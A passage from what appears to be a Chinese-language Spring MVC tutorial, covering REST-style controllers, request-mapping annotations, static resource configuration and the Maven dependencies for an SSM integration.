class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注解：<ul><li>名称：@ResponseBody</li><li>类型：方法注解</li><li>位置：SpringMVC 控制器方法定义上方</li><li>作用：设置当前控制器返回值作为响应体</li></ul></li><li>HttpMessageConverter 接口：类型转换器</li></ul><h1 id="12-rest风格简介"><a class="markdownIt-Anchor" href="#12-rest风格简介">#</a> 12、REST 风格简介</h1><ul><li>REST（Representational State Transfer），表现形式状态转换<ul><li>传统风格资源描述形式<ul><li><a href="http://localhost/user/getById?id=1">http://localhost/user/getById?id=1</a></li><li><a href="http://localhost/user/saveUser">http://localhost/user/saveUser</a></li></ul></li><li>REST 风格描述形式<ul><li><a href="http://localhost/user/1">http://localhost/user/1</a></li><li><a href="http://localhost/user">http://localhost/user</a></li></ul></li></ul></li><li>优点：<ul><li>书写简化</li><li>隐藏访问的资源行为，无法通过地址得知对资源是何种操作</li></ul></li><li>按照 REST 风格访问资源时使用行为动作区分对资源进行了何种操作<ul><li><a href="http://localhost/users">http://localhost/users</a>查询全部用户信息  GET（查询）</li><li><a href="http://localhost/users/1">http://localhost/users/1</a>      查询指定用户信息 GET（查询）</li><li><a href="http://localhost/users">http://localhost/users</a>    添加用户信息 POST （新增 / 保存）</li><li><a href="http://localhost/users">http://localhost/users</a>    修改用户信息 PUT （修改 / 更新）</li><li><a href="http://localhost/users/1">http://localhost/users/1</a>    删除用户信息 DELETE （删除）</li></ul></li><li>根据 REST 风格对资源进行访问称为<strong> RESTful</strong></li><li>注意事项：上述行为是约定方式，约定不是规范，可以打破，所以称 REST 风格，而不是 REST 规范；描述模块的名称通常是用复数，也就是加 s 的格式描述，表示此类资源，而非单个资源，例如 users、books、accounts…</li></ul><h1 id="13-rest入门案例"><a class="markdownIt-Anchor" href="#13-rest入门案例">#</a> 13、REST 入门案例</h1><ol><li><p>设定 http 请求动作（动词）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>POST<span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user save'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>PUT<span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user update ..."</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user update'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设定请求参数（路径变量）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users/&#123;id&#125;"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>DELETE<span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user delete ..."</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user delete'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ul><li><p>注解：</p><ul><li>名称：@RequestMapping</li><li>类型：方法注解</li><li>位置：SpringMVC 控制器方法定义上方</li><li>作用：设置当前控制器方法请求访问路径</li><li>属性：<ul><li>value（默认）：请求访问路径</li><li>method：http 请求动作，标准动作 (GET/POST/PUT/DELETE)</li></ul></li></ul></li><li><p>@RequestBody&amp;@RequestParam&amp;@PathVariable</p><ul><li>区别<ul><li>@RequestParam 用于接收 url 地址传参或表单传参</li><li>@RequestBody 用于接受 JSON 数据</li><li>@PathVariable 用于接收路径参数，使用 {参数名称} 描述路径参数</li></ul></li><li>应用<ul><li>后期开发中，发送请求超过 1 个参数时，以 JSON 格式为主，@RequestBody 应用较广</li><li>如果发送非 JSON 格式数据，选用 @RequestParam 接收请求参数</li><li>采用 RESTful 进行开发，当参数数量较少时，例如一个，可以采用 @PathVariable 接收请求路径变量，通常用于传递 id 值</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController2</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>POST<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user save'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users/&#123;id&#125;"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>DELETE<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user delete ..."</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user delete'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>PUT<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user update ..."</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user update'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users/&#123;id&#125;"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getById</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user getById ..."</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user getById'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user getAll ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user getAll'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="14-restful快速开发"><a class="markdownIt-Anchor" href="#14-restful快速开发">#</a> 14、RESTful 快速开发</h1><ul><li><p>注解：</p><ul><li><p>名称：@RestController</p></li><li><p>类型：类注解</p></li><li><p>位置：基于 SpringMVC 的 RESTful 开发控制器类定义上方</p></li><li><p>作用：设置当前控制器类为 RESTful 风格，等同于 @Controller 与 @ResponseBody 两个注解组合功能</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/users"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController2</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>注解：</p><ul><li><p>名称：@GetMapping @PostMapping @PutMapping @DeleteMapping</p></li><li><p>类型：方法注解</p></li><li><p>位置：基于 SpringMVC 的 RESTful 开发控制器方法定义上方</p></li><li><p>作用：设置当前控制器方法请求访问路径与请求动作，每一种对应一个请求动作，例如 @GetMapping 对应 GET 请求</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/&#123;id&#125;"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getById</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user getById ..."</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user getById'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>属性：value (默认)：请求访问路径</p></li></ul></li></ul><h1 id="15-案例基于restful页面数据交互"><a class="markdownIt-Anchor" href="#15-案例基于restful页面数据交互">#</a> 15、案例：基于 RESTful 页面数据交互</h1><ul><li>放行非 SpringMVC 请求</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResourceHandlerRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebMvcConfigurationSupport</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token comment">//在扫描配置中加上这个包 // @ComponentScan(&#123;"com.itheima.controller","com.itheima.config"&#125;)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcSupport</span> <span class="token keyword">extends</span> <span class="token class-name">WebMvcConfigurationSupport</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//当访问/pages/???时候不要走MVC，走/pages目录下的内容</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/pages/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/pages/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/js/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/js/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/css/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/css/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/plugins/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"/plugins/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="16-ssm整合"><a class="markdownIt-Anchor" href="#16-ssm整合">#</a> 16、SSM 整合</h1><h2 id="161-整合流程"><a class="markdownIt-Anchor" href="#161-整合流程">#</a> 16.1 整合流程</h2><ol><li>创建工程</li><li>SSM 整合<ul><li>Spring<ul><li>SpringConfig</li></ul></li><li>MyBatis<ul><li>MyBatisConfig</li><li>JdbcConfig</li><li>jdbc.properties</li></ul></li><li>SpringMVC<ul><li>ServletConfig</li><li>SpringMVCConfig</li></ul></li></ul></li><li>功能模块<ul><li>表与实体类</li><li>dao（接口 + 自动代理）</li><li>service（接口 + 实现类）<ul><li>业务层接口测试（整合 junit）</li></ul></li><li>Controller<ul><li>表现层接口测试（PostMan）</li></ul></li></ul></li></ol><h2 id="162-用到的所有依赖"><a class="markdownIt-Anchor" href="#162-用到的所有依赖">#</a> 16.2 用到的所有依赖</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    springweb--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-webmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    spring-jdbc--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-jdbc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    springtest--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    mybatis--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    spring整和mybatis--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis-spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    mysql--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.0.15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    德鲁伊--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>druid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.1.16<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    servlet--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.servlet-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    JSON--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat.maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat7-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.2<span class="token tag"><span class="token tag"><span class="token 